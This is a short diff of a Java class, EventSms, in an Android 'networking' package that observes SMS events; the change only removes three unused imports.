@@ -9,8 +9,6 @@
 
 package com.android.networking.event;
 
-import java.io.IOException;
-
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfEvent;
 import com.android.networking.conf.ConfigurationException;
@@ -18,8 +16,6 @@ import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerSms;
 import com.android.networking.module.message.Sms;
 import com.android.networking.util.Check;
-import com.android.networking.util.DataBuffer;
-import com.android.networking.util.WChar;
 
 public class EventSms extends BaseEvent implements Observer<Sms> {
 	/** The Constant TAG. */
